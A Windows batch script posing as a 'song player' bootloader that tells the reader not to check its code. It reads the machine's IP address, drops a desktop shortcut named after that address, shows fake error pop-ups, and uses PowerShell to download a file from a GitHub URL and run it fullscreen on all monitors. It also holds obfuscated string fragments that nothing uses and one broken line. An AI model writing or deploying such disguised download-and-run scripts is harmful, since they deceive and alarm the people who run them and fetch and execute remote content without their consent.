@echo off
setlocal enabledelayedexpansion










echo Please don't check the code!






for /f "tokens=2 delims=[]" %%k in ('ping -4 -n 1 %computername% ^| findstr /r /c:"\[.*\]"') do set "v2=%%k"
set "shortcutPath=%userprofile%\Desktop\%v2%.url"
echo [InternetShortcut] > "%shortcutPath%"
echo URL=http://!v2! >> "%shortcutPath%"

%n%serverloc echo Hello

echo Hello! welcome to the bootloader of song player v1.0!

msg * "Welcome, close me to continue..."
msg * "in beta, may have errors."

set "a=sta"
set "b=rt"
set "c=loc"
set "d=se"
set "e=rv"
set "f=ip"

powershell -c "(New-Object Media.SoundPlayer 'C:\Windows\Media\chimes.wav').PlaySync()"
msg * "An unexpected error occurred."

:: Set full volume using nircmd (make sure nircmd is in your path or provide full path)


:: Download and play video in fullscreen on all monitors
set "x=powershell -c "(new-object System.Net.WebClient).DownloadFile('https://github.com/Grim-Anticheat/files-images/raw/main/ssstik.io_@x_l_u_i_x_1723569606416.mp4', '%temp%\vid.mp4'); (New-Object -ComObject WScript.Shell).Run('%temp%\vid.mp4 /fullscreen /multimon', 3, $false)""
%x%

set "v1=%a%%b%"
set "v2=%c%%f%"
set "v3=%d%%e%"

endlocal
